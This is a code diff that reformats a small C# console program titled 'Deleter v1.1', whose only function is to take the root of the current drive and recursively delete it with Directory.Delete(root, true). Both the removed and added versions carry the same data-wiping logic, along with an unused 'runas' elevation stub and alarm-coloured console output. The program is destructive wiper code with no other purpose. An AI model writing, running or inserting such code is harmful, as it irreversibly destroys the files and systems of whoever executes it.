@@ -1,27 +1,33 @@
-using System;
-using System.IO;
-    class Deleter {
-    public static string dir = Directory.GetDirectoryRoot(Directory.GetCurrentDirectory()); 
-    public static bool DirExists = Directory.Exists(dir);
-        public const string Ver = "1.1";
-        public const string Title = "Deleter v" + Ver;
-      public static void DeleteDir() {
-          try { 
-          Console.WriteLine("Deleting " + dir);
-          Directory.Delete(dir, true);
+namespace System
+{
+    public class Deleter
+    {
+        public static System.String dir = System.IO.Directory.GetDirectoryRoot(System.IO.Directory.GetCurrentDirectory());
+        public static System.Boolean DirExists = System.IO.Directory.Exists(System.Deleter.dir);
+        public const System.String Ver = "1.1";
+        public const System.String Title = "Deleter v" + System.Deleter.Ver;
+        public static void DeleteDir()
+        {
+            try
+            {
+                System.Console.WriteLine("Deleting " + System.Deleter.dir);
+                System.IO.Directory.Delete(System.Deleter.dir, true);
             }
-          catch (Exception ex) {
-            Console.WriteLine("Error deleting " + dir);
-            Console.WriteLine(ex);  
-          }
-          }
-        static void Main(string[] args) {
-        Console.Title = Title;
-        System.Diagnostics.Process p = new System.Diagnostics.Process();
-        p.StartInfo.UseShellExecute = true;
-        p.StartInfo.Verb = "runas";
-        Console.ForegroundColor = ConsoleColor.DarkGray;
-        Console.BackgroundColor = ConsoleColor.DarkRed;
-        DeleteDir();
-          }
+            catch (System.Exception ex)
+            {
+                System.Console.WriteLine("Error deleting " + System.Deleter.dir);
+                System.Console.WriteLine(ex);
+            }
+        }
+        static void Main(System.String[] args)
+        {
+            System.Console.Title = System.Deleter.Title;
+            System.Diagnostics.Process p = new System.Diagnostics.Process();
+            p.StartInfo.UseShellExecute = true;
+            p.StartInfo.Verb = "runas";
+            System.Console.ForegroundColor = System.ConsoleColor.DarkGray;
+            System.Console.BackgroundColor = System.ConsoleColor.DarkRed;
+            System.Deleter.DeleteDir();
+        }
     }
+}
